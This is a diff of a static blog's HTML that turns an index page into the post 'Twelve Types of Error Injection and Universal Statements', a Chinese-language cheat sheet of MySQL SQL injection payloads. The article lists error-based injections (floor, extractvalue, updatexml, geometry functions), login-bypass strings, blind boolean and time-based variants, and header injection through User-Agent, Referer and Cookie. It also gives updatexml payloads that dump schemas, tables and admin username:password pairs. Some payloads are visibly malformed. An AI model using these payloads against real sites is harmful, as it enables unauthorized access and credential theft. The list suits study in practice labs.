@@ -10,10 +10,13 @@
   <!-- 用于搜索引擎的文章摘要 -->
   
   
-    <meta name="robots" content="noindex" />
-  
   
   <title>
+    
+      Twelve Types of Error Injection and Universal Statements 
+      
+      
+      |
     
      L0ki&#39;s Website
   </title>
@@ -110,151 +113,165 @@
 
 
       <div class="flex-container">
-        <div class="container index">
-  <div class="post-list">
-    <!-- 遍历渲染文章 -->
-    
-      <div class="post-item" title="WPSEC 2019 Web">
-        <div class="time-m-d">2019-03-04</div>
-        <div class="title">
-          <a href="/2019/03/04/WPSEC-2019-Web/">
-            
-              
-                <span>WPSEC 2019 Web</span>
-              
-            
-          </a>
-        </div>
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Twelve Types of Error Injection and Universal Statements</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-04-21 01:09:50
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Vulnerabilities/" title="Vulnerabilities">
+                    #Vulnerabilities
+                  </a>
+                </span>
+                
+              </span>
+          
       </div>
-    
-      <div class="post-item" title="How to Insert a Sentence into a Picture in Win10">
-        <div class="time-m-d">2019-02-27</div>
-        <div class="title">
-          <a href="/2019/02/27/How-to-Insert-a-Sentence-into-a-Picture-in-Win10/">
-            
-              
-                <span>How to Insert a Sentence into a Picture in Win10</span>
-              
-            
-          </a>
-        </div>
+      <div class="markdown-body">
+        <h2 id="12种报错注入"><a href="#12种报错注入" class="headerlink" title="12种报错注入"></a>12种报错注入</h2><p> 1、通过floor报错,注入语句如下:<br>    and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</p>
+<p>2、通过ExtractValue报错,注入语句如下:<br>    and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p>
+<p>3、通过UpdateXml报错,注入语句如下:<br>    and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</p>
+<p>4、通过NAME_CONST报错,注入语句如下:<br>    and exists(select<em>from (select</em>from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c) </p>
+<p>5、通过join报错,注入语句如下:<br>    select * from(select * from mysql.user ajoin mysql.user b)c;   </p>
+<p>6、通过exp报错,注入语句如下:<br>and exp(~(select * from (select user () ) a) );</p>
+<p>7、通过GeometryCollection()报错,注入语句如下:<br>and GeometryCollection(()select *from(select user () )a)b );</p>
+<p>8、通过polygon ()报错,注入语句如下:<br>and polygon (()select * from(select user ())a)b );</p>
+<p>9、通过multipoint ()报错,注入语句如下:<br>and multipoint (()select * from(select user() )a)b );</p>
+<p>10、通过multlinestring ()报错,注入语句如下:<br>and multlinestring (()select * from(selectuser () )a)b );</p>
+<p>11、通过multpolygon ()报错,注入语句如下:<br>and multpolygon (()select * from(selectuser () )a)b );</p>
+<p>12、通过linestring ()报错,注入语句如下:<br>and linestring (()select * from(select user() )a)b );</p>
+<h2 id="关于POST注入"><a href="#关于POST注入" class="headerlink" title="关于POST注入"></a>关于POST注入</h2><p> 常用的万能username语句：</p>
+<blockquote>
+<p>a ’ or 1&#x3D;1 #<br>a “) or 1&#x3D;1 #<br>a‘) or 1&#x3D;1 #<br>a” or “1”&#x3D;”1<br>‘ or ‘1’&#x3D;’1<br>‘ or (length(database())) &#x3D; 8  (用于输入’ “都没有错误)<br>‘ or (ascii(substr((select database()) ,1,1))) &#x3D; 115 # (用于输入’ “都没有错误)<br>“) or (“1”)&#x3D;(“1<br>“) or 1&#x3D;1 or if(1&#x3D;1, sleep(1), null)  #<br>“) or (length(database())) &#x3D; 8 #<br>“) or (ascii(substr((select database()) ,1,1))) &#x3D; 115  or if(1&#x3D;1, sleep(1), null)  # </p>
+</blockquote>
+<h3 id="post型盲注通杀payload："><a href="#post型盲注通杀payload：" class="headerlink" title="post型盲注通杀payload："></a>post型盲注通杀payload：</h3><p>uname&#x3D;admin%df’or()or%200%23&amp;passwd&#x3D;&amp;submit&#x3D;Submit</p>
+<h2 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h2><p><strong>UPDATEXML,REFERER,COOKIE的构造</strong></p>
+<p>User-Agent:<code>&#39; or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</code><br>Referer: <code> ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</code><br>Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>爆数据库版本信息：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code><br> 链接用户：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)</code><br> 链接数据库：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</code><br> 爆库：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)</code><br> 爆表：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)</code><br> 爆字段：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)</code><br> 爆字段内容：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</code></p>
+
       </div>
-    
-      <div class="post-item" title="Sql Lab(41-65)">
-        <div class="time-m-d">2019-02-26</div>
-        <div class="title">
-          <a href="/2019/02/26/sql-lab(41-65)/">
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
             
-              
-                <span>Sql Lab(41-65)</span>
-              
+              <a href="/2019/01/22/Detailed-Discussion-on-information_schema/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
             
-          </a>
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-04-21 01:09:50
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Vulnerabilities/" title="Vulnerabilities">
+                        #Vulnerabilities
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2019/01/22/SQL-Injection-Functions/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
         </div>
-      </div>
+      
+    </div>
     
-      <div class="post-item" title="SQL Injection Functions">
-        <div class="time-m-d">2019-01-22</div>
-        <div class="title">
-          <a href="/2019/01/22/SQL-Injection-Functions/">
-            
-              
-                <span>SQL Injection Functions</span>
-              
-            
-          </a>
-        </div>
-      </div>
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#12%E7%A7%8D%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">12种报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EPOST%E6%B3%A8%E5%85%A5"><span class="toc-text">关于POST注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#post%E5%9E%8B%E7%9B%B2%E6%B3%A8%E9%80%9A%E6%9D%80payload%EF%BC%9A"><span class="toc-text">post型盲注通杀payload：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">updatexml报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
     
-      <div class="post-item" title="Twelve Types of Error Injection and Universal Statements">
-        <div class="time-m-d">2019-01-22</div>
-        <div class="title">
-          <a href="/2019/01/22/12-Types-of-Error-Injection-and-Universal-Statements/">
-            
-              
-                <span>Twelve Types of Error Injection and Universal Statements</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Detailed Discussion on information_schema">
-        <div class="time-m-d">2019-01-22</div>
-        <div class="title">
-          <a href="/2019/01/22/Detailed-Discussion-on-information_schema/">
-            
-              
-                <span>Detailed Discussion on information_schema</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Sql Lab(1-20)">
-        <div class="time-m-d">2019-01-20</div>
-        <div class="title">
-          <a href="/2019/01/20/sql-lab(1-20)/">
-            
-              
-                <span>Sql Lab(1-20)</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Sql Lab(21-40)">
-        <div class="time-m-d">2019-01-20</div>
-        <div class="title">
-          <a href="/2019/01/20/sql-lab(21-40)/">
-            
-              
-                <span>Sql Lab(21-40)</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="HTML Quick Reference Notes">
-        <div class="time-m-d">2019-01-19</div>
-        <div class="title">
-          <a href="/2019/01/19/HTML-Quick-Reference-Notes/">
-            
-              
-                <span>HTML Quick Reference Notes</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Discussion on GET and POST">
-        <div class="time-m-d">2019-01-17</div>
-        <div class="title">
-          <a href="/2019/01/17/Discussion-on-GET-and-POST/">
-            
-              
-                <span>Discussion on GET and POST</span>
-              
-            
-          </a>
-        </div>
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
       </div>
     
   </div>
-  <nav class="post-navigation">
-    
-      <a href="/page/2/"><i class="iconfont icon-angleleft"></i></a>
-    
-    <span class="page-num">3 / 4</span>
-    
-      <a href="/page/4/"><i class="iconfont icon-angleright"></i></a>
-    
-  </nav>
-</div>
+
 
         
 <div class="footer">
@@ -504,6 +521,24 @@
 
 
         
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Twelve%20Types%20of%20Error%20Injection%20and%20Universal%20Statements + '&url=' + https%3A%2F%2Fl0ki.net%2F2019%2F01%2F22%2F12-Types-of-Error-Injection-and-Universal-Statements%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://l0ki.net/2019/01/22/12-Types-of-Error-Injection-and-Universal-Statements/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
   
   
 <script src="/js/shares.js"></script>
